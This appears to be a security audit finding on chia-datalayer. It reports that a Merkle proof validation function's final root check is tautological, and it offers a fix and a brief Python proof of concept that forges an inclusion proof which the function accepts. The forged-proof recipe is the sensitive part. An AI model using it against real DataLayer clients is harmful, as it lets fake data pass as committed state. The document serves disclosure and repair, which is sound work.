### Title
`ProofOfInclusion::valid()` Tautological Root-Hash Check Allows Forged DataLayer Merkle Inclusion Proofs — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` contains a final check (`existing_hash == self.root_hash()`) that is always `true` after the loop completes successfully. The function therefore only validates the internal self-consistency of the proof's layer chain; it never compares the computed root against any external trusted root. An attacker can construct a fully fabricated `ProofOfInclusion` for an arbitrary `node_hash` with internally consistent layers, and `valid()` will return `true`, enabling forged DataLayer inclusion proofs to pass the only validation gate exposed to callers (including the Python binding `py_valid()`).

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()   // ← always true
}
``` [1](#0-0) 

`root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

**Tautology proof:**

After the loop body executes for the last layer:
- The loop invariant `calculated_hash == layer.combined_hash` was just asserted (otherwise the function would have returned `false`).
- `existing_hash` is then set to `calculated_hash`.
- Therefore `existing_hash` **equals** `self.layers.last().combined_hash`.
- `self.root_hash()` returns exactly `self.layers.last().combined_hash`.
- The final comparison `existing_hash == self.root_hash()` is therefore **always `true`**.

The function is equivalent to checking only that each layer's stored `combined_hash` equals the hash computed from the previous level and the sibling — a purely self-referential consistency check. It never compares the computed root against any externally committed, trusted root hash.

### Impact Explanation

An attacker who can deliver a `ProofOfInclusion` object to any DataLayer consumer (Rust or Python) can:

1. Choose an arbitrary target `node_hash` (e.g., the hash of a fake key-value pair they wish to prove is in the tree).
2. Build any number of layers, each with a freely chosen `other_hash` and a `combined_hash` computed correctly from the previous level and the chosen sibling — making the chain internally consistent.
3. Submit this fabricated proof; `valid()` (and `py_valid()`) returns `true`.

No knowledge of the real tree contents or the real root is required. The attacker fully controls the claimed `node_hash` and the claimed `root_hash` (returned by `root_hash()`). Any caller that relies solely on `valid()` — the only validation method on the type — accepts the forged proof and treats the fake key-value pair as present in the DataLayer tree.

This matches the allowed High impact: **"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … or lets untrusted input prove invalid state."**

### Likelihood Explanation

- `valid()` is the **only** validation method on `ProofOfInclusion`; there is no overload or companion function that accepts a trusted root parameter.
- The Python binding `py_valid()` is the natural and only API surface for Python DataLayer consumers to verify a received proof.
- The existing test suite calls `proof_of_inclusion.valid()` without separately asserting `proof.root_hash() == trusted_root`, reinforcing the expectation that `valid()` is a complete check. [5](#0-4) 

Any DataLayer client that receives a proof over the network and calls `proof.valid()` without also asserting `proof.root_hash() == <on-chain-committed-root>` is fully vulnerable.

### Recommendation

Replace the tautological final check with a comparison against a caller-supplied trusted root. The simplest fix is to add a `trusted_root` parameter:

```rust
pub fn valid_against(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }

    &existing_hash == trusted_root   // compare against externally trusted root
}
```

Alternatively, rename the current `valid()` to `is_internally_consistent()` to make its limited scope explicit, and require all security-critical call sites to additionally assert `proof.root_hash() == trusted_root`. Update the Python binding accordingly.

### Proof of Concept

```python
from chia_rs import ProofOfInclusion, ProofOfInclusionLayer, Hash, Side

# Real tree has root R and does NOT contain key K.
# Attacker wants to forge a proof that K is in the tree.

fake_leaf_hash = Hash(b'\xaa' * 32)          # hash of fake (K, V)
fake_sibling   = Hash(b'\xbb' * 32)          # arbitrary sibling

# Compute combined_hash honestly so the layer is internally consistent
from chia_rs import calculate_internal_hash   # or replicate the sha256 logic
combined = calculate_internal_hash(fake_leaf_hash, Side.Right, fake_sibling)

layer = ProofOfInclusionLayer(
    other_hash_side=Side.Right,
    other_hash=fake_sibling,
    combined_hash=combined,
)

forged_proof = ProofOfInclusion(node_hash=fake_leaf_hash, layers=[layer])

assert forged_proof.valid()          # returns True — proof accepted
# forged_proof.root_hash() == combined  (attacker-controlled, not the real root)
```

The forged proof passes `valid()` despite `node_hash` and the claimed root being entirely fabricated. Any consumer that does not separately assert `forged_proof.root_hash() == real_committed_root` will accept the forgery.

pub fn internal_hash(left_hash: &Hash, right_hash: &Hash) -> Hash {
    let mut hasher = Sha256::new();
    hasher.update(b"\x02");
    hasher.update(left_hash.0);
    hasher.update(right_hash.0);

    Hash(Bytes32::new(hasher.finalize()))
}

pub fn calculate_internal_hash(hash: &Hash, other_hash_side: Side, other_hash: &Hash) -> Hash {
    match other_hash_side {
        Side::Left => internal_hash(other_hash, hash),
        Side::Right => internal_hash(hash, other_hash),
    }
}
